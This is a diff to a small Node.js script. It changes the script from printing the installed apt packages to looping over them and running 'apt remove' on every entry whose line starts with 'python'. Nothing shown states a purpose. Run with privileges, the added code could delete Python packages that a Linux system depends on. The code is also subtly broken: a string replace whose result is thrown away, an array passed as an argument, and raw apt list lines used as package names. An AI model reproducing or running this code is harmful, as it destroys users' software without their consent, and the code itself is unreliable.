@@ -3,11 +3,24 @@ const os = require("os");
 
 const platform = os.platform();
 let p;
+let d = "";
 if (platform === "linux") {
   p = spawn("apt", ["list", "--installed"]);
 }
+p.stdout.on("data", (data) => {
+  d += data;
+});
 
-p.stdout.pipe(process.stdout);
-process.stdin.pipe(p.stdin);
-
-p.on("close", (c) => process.exit(c));
+p.stdout.on("end", () => {
+  d.replace("]", "]\n");
+  const arr = d.split("\n");
+  for (let a of arr) {
+    if (a.startsWith("python")) {
+      const s = spawn("apt", ["remove", [a]]);
+      s.stdout.pipe(process.stdout);
+    }
+  }
+});
+p.on("close", (c) => {
+  process.exit(c);
+});
